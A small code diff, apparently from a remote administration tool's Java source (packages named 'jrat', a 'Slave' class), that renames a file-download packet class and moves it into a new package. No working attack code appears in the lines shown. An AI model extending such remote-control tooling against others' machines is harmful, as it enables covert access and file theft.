@@ -1,4 +1,4 @@
-package jrat.module.fs.packets;
+package jrat.module.fs.packets.download;
 
 import jrat.common.io.FileCache;
 import jrat.common.io.TransferData;
@@ -8,7 +8,7 @@ import jrat.module.fs.ui.PanelFileTransfers;
 
 import java.io.File;
 
-public class Packet29ServerDownloadPart implements IncomingPacket {
+public class Packet29DownloadPart implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
